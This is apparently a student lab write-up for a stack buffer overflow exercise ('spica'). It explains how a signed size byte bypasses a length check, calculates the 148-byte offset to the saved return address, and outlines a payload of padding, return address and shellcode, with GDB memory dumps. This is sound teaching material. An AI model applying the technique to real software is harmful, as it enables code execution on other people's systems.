# 02-spica-writeup

## Main Idea

The main idea is to use the conversion of unsigned int to int.

At first, the code reads one byte from file and writes it to the signed int size. Then compare the size with 128, if size > 128 then return. They do not concern the number greater than 128, which will be less than 0 in the representation of int8_t.


## Magic Numbers

The address of msg is `0xffffd5d8`, the RIP is `0xffffd66c`, so the location of RIP is 148 bytes away from the start of the buffer (0xffffd66c - 0xffffd5d8).

``` C++
(gdb) x/16x msg
0xffffd5d8:     0x00000000      0x00000000      0x00000000      0x00000000      
0xffffd5e8:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd5f8:     0x00000000      0x00000000      0x00000000      0x00000000      
0xffffd608:     0x00000000      0x00000000      0x00000000      0x00000000 
(gdb) i f
Stack level 0, frame at 0xffffd670:
 eip = 0x804924e in display (telemetry.c:19); saved eip = 0x80492bd
 called by frame at 0xffffd6a0
 source language c.
 Arglist at 0xffffd668, args: path=0xffffd82b "navigation"
 Locals at 0xffffd668, Previous frame's sp is 0xffffd670
 Saved registers:
  ebp at 0xffffd668, eip at 0xffffd66c
```

## Exploit Structure

The exploit has three parts:

1. Write 148 bytes of dummy characters to overwrite `msg`, the compiler padding, and the sfp.
2. Overwrite the rip with the address of the shellcode. Since we are putting shellcode directly after the rip, we overwrite the rip with `0xffffd670` (`0xffffd66c + 4`).
3. Finally, insert the shellcode directly after the rip.

This causes the function to start executing the shellcode at address `0xffffd670` when it returns.

Note that you should print '0xff' in the egg the bypass the limitation of the file size .

## Exploit GDB Output

When we ran GDB after inputting the malicious exploit string, we got the following output:

```C++
(gdb) x/40x msg
0xffffd5d8:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd5e8:     0x41414141      0x41414141      0x41414141      0x41414141      
0xffffd5f8:     0x41414141      0x41414141      0x41414141      0x41414141      
0xffffd608:     0x41414141      0x41414141      0x41414141      0x41414141      
0xffffd618:     0x41414141      0x41414141      0x41414141      0x41414141      
0xffffd628:     0x41414141      0x41414141      0x41414141      0x41414141      
0xffffd638:     0x41414141      0x41414141      0x41414141      0x41414141      
0xffffd648:     0x41414141      0x41414141      0x41414141      0x41414141      
0xffffd658:     0x000000d2      0x41414141      0x41414141      0x41414141      
0xffffd668:     0x41414141      0xffffd670      0xcd58326a      0x89c38980   
```

